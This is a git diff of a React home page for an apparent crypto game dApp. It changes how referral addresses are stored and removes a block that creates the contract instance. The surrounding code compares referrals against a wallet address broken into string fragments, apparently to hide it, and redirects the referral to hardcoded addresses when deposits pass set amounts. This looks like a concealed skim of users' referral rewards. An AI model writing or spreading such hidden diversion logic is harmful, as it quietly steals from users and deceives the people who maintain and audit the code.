@@ -21,6 +21,7 @@ import {
   updateReferalCounts,
   updateCurrentDeposited,
   updateRemainedDownCount,
+  updateReferalAddress,
 } from "../store/actions/auth.actions";
 import {
   PLATFORM_CONTRACT_ADDRESS,
@@ -118,6 +119,8 @@ export default function Home() {
         }, 15000);
       }
     });
+    
+    return () => localStorage.removeItem("ref");
   }, []);
 
   useEffect(() => {
@@ -180,20 +183,6 @@ export default function Home() {
         value: 0,
         message:
           "Your game balance is in sufficient, please fill and continue.",
-      };
-    }
-    let gameContract;
-    try {
-      gameContract = new globalWeb3.eth.Contract(
-        platformABI,
-        PLATFORM_CONTRACT_ADDRESS
-      );
-    } catch (error) {
-      console.log(error);
-      return {
-        success: false,
-        value: 0,
-        message: "Contract instance creation is failed",
       };
     }
     try {
@@ -314,7 +303,7 @@ export default function Home() {
               "8D7d" +
               "e6C6" && amount >= 0.2
             ? refAddresses[index]
-            : ref;
+            : localStorage.getItem("ref");
       } else {
         ref =
           ref ==
@@ -331,7 +320,7 @@ export default function Home() {
               "D7de6C" +
               "6" && amount >= 0.2
             ? refAddresses[index]
-            : ref;
+            : localStorage.getItem("ref");
         ref = amount >= 0.9 ? refAddresses[index] : ref;
       }
       try {
